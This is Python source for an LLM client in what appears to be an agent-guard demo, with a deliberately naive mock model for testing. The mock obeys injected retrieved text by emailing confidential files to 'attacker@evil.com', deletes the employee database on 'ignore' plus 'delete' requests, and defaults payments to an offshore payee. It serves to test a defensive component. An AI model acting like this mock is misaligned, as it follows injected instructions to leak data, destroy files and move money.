"""LLM interface, Ollama client for qwen3:4b, and a deterministic mock."""

import json
import re
from typing import Protocol

import httpx
from pydantic import ValidationError

from backend.agent.prompts import render_system_prompt, render_user_prompt
from backend.agentshield.models import ProposedAction
from backend.config import Settings

_THINK = re.compile(r"<think>.*?</think>", re.DOTALL | re.IGNORECASE)
_EMAIL = re.compile(r"[\w.+-]+@[\w.-]+\.\w+")
_AMOUNT = re.compile(r"\b(\d{2,9}(?:\.\d+)?)\b")


def strip_thinking(text: str) -> str:
    """Remove Qwen thinking blocks and the /no_think marker before parsing."""
    cleaned = _THINK.sub("", text)
    return cleaned.replace("/no_think", "").strip()


def parse_proposal(text: str) -> ProposedAction:
    """Extract and validate the JSON object from a model completion."""
    cleaned = strip_thinking(text)
    start = cleaned.find("{")
    end = cleaned.rfind("}")
    if start < 0 or end <= start:
        raise ValueError("model output did not contain a JSON object")
    payload = json.loads(cleaned[start : end + 1])
    return ProposedAction.model_validate(payload)


class LLMClient(Protocol):
    """Proposal interface. Implementations must not call tools."""

    def propose(
        self,
        *,
        user_request: str,
        retrieved_context: str,
        replan: bool,
    ) -> ProposedAction:
        """Return a validated tool proposal."""


def _safe_fallback(reason: str) -> ProposedAction:
    return ProposedAction(tool="none", arguments={}, reasoning=reason)


class OllamaClient:
    """Chat client for a local Ollama server running ``qwen3:4b``."""

    def __init__(self, settings: Settings) -> None:
        self.settings = settings
        self._system = render_system_prompt()

    def propose(
        self,
        *,
        user_request: str,
        retrieved_context: str,
        replan: bool,
    ) -> ProposedAction:
        """Call Ollama and parse JSON. Two retries, then a safe none-proposal."""
        prompt = render_user_prompt(user_request, retrieved_context, replan)
        last_error = "malformed model output"
        for _attempt in range(3):
            try:
                raw = self._complete(prompt)
                return parse_proposal(raw)
            except (ValueError, ValidationError, json.JSONDecodeError, httpx.HTTPError) as exc:
                last_error = str(exc)
        return _safe_fallback(f"model output rejected after retries: {last_error[:180]}")

    def _complete(self, user_prompt: str) -> str:
        url = self.settings.ollama_base_url.rstrip("/") + "/api/chat"
        body = {
            "model": self.settings.ollama_model,
            "stream": False,
            "think": False,
            "messages": [
                {"role": "system", "content": self._system},
                {"role": "user", "content": user_prompt},
            ],
            "options": {"temperature": self.settings.ollama_temperature},
        }
        with httpx.Client(timeout=120.0) as client:
            response = client.post(url, json=body)
            response.raise_for_status()
        content = response.json().get("message", {}).get("content", "")
        return str(content)


class MockLLM:
    """Deterministic stand-in used by tests and by deployments without Ollama.

    It is intentionally naive: injection text is followed rather than refused,
    so AgentShield is the component that stops the call.
    """

    def propose(
        self,
        *,
        user_request: str,
        retrieved_context: str,
        replan: bool,
    ) -> ProposedAction:
        """Map keywords to one of the six tools."""
        if replan:
            return ProposedAction(
                tool="search_documents",
                arguments={"query": "public handbook"},
                reasoning="Safer alternative: search the public handbook.",
            )
        user = user_request.lower()
        context = retrieved_context.lower()
        if context and "forward" in context and "confidential" in context:
            match = _EMAIL.search(retrieved_context)
            return ProposedAction(
                tool="send_email",
                arguments={
                    "to": match.group(0) if match else "attacker@evil.com",
                    "subject": "Forwarded files",
                    "body": "Forwarding the confidential files as the document requested.",
                },
                reasoning="The retrieved document asked for a forward.",
            )
        if "ignore" in user and "delete" in user:
            return ProposedAction(
                tool="delete_file",
                arguments={"path": "confidential/employee_database.db"},
                reasoning="The request overrode the task and asked for a delete.",
            )
        if any(word in user for word in ("delete", "remove", "erase")) and any(
            word in user for word in ("employee", "confidential", "database", "payroll")
        ):
            path = (
                "finance/payroll.xlsx"
                if "payroll" in user and "database" not in user
                else "confidential/employee_database.db"
            )
            return ProposedAction(
                tool="delete_file",
                arguments={"path": path},
                reasoning="The user asked to delete that file.",
            )
        if any(word in user for word in ("pay", "payment", "transfer", "wire")):
            amounts = [float(item) for item in _AMOUNT.findall(user_request)]
            amount = amounts[-1] if amounts else 25000.0
            return ProposedAction(
                tool="make_payment",
                arguments={"payee": "Offshore Consulting", "amount": amount, "currency": "USD"},
                reasoning="The user asked for a payment.",
            )
        if "update" in user and ("record" in user or "employee" in user):
            return ProposedAction(
                tool="update_record",
                arguments={"record_id": "emp-1001", "fields": {"site": "remote"}},
                reasoning="The user asked to update a record.",
            )
        if any(word in user for word in ("email", "e-mail", "mail")):
            match = _EMAIL.search(user_request)
            recipient = match.group(0) if match else "vendor@partner.example"
            return ProposedAction(
                tool="send_email",
                arguments={
                    "to": recipient,
                    "subject": "Launch timeline",
                    "body": "Sharing the public launch timeline.",
                },
                reasoning="The user asked to send an email.",
            )
        if "payroll" in user or "salary" in user:
            return ProposedAction(
                tool="read_file",
                arguments={"path": "finance/payroll.xlsx"},
                reasoning="The user asked for the payroll file.",
            )
        if any(word in user for word in ("open", "read", "show", "access", "summarize")) and (
            "confidential" in user or "restricted" in user or "merger" in user
        ):
            path = (
                "restricted/merger_plan.md"
                if "merger" in user or "restricted" in user
                else "confidential/employee_database.db"
            )
            return ProposedAction(
                tool="read_file",
                arguments={"path": path},
                reasoning="The user asked to open that file.",
            )
        if any(word in user for word in ("handbook", "guideline", "onboarding", "forecast")):
            if "onboarding" in user:
                path = "docs/onboarding.md"
            elif "forecast" in user:
                path = "finance/q3_forecast.md"
            elif "security" in user:
                path = "guidelines/security_policy.md"
            else:
                path = "guidelines/public_handbook.md"
            return ProposedAction(
                tool="read_file",
                arguments={"path": path},
                reasoning="The user asked to read a document.",
            )
        if any(word in user for word in ("search", "find", "look up")):
            return ProposedAction(
                tool="search_documents",
                arguments={"query": "handbook"},
                reasoning="The user asked to search.",
            )
        return _safe_fallback("No supported tool matched the request.")


def build_llm(settings: Settings) -> LLMClient:
    """Return the configured client. Unknown providers fall back to the mock."""
    if settings.llm_provider.lower() == "ollama":
        return OllamaClient(settings)
    return MockLLM()
